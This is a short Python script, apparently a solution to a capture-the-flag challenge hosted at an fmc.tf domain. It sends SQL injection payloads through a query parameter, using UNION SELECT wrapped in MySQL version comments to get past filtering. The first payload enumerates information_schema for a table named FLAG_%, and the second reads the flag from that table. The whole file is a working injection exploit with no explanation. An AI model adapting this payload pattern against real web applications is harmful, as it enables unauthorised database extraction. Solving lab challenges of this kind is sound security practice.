import re
import requests

url = "https://blackmirror-chall.fmc.tf/"

def make_query(query):
    response = requests.get(url, params={"query": query})
    return response.text

sql = "SELECT table_name FROM information_schema.tables WHERE table_name LIKE \"FLAG_%\""
q1 = f"A\") /*! UNION SELECT NULL, NULL, ({sql}), NULL */ +"
r1 = make_query(q1)
idx = r1.rfind("FLAG_")
flag_table = r1[idx:idx+29]
print(f"[+] Table name: {flag_table}")


q2 = f"A\") /*! UNION SELECT NULL, NULL, (SELECT flag FROM {flag_table}), NULL */ +"
r2 = make_query(q2)
flag = re.search("FMCTF{.+}", r2).group()
print(f"[+] FLAG: {flag}")
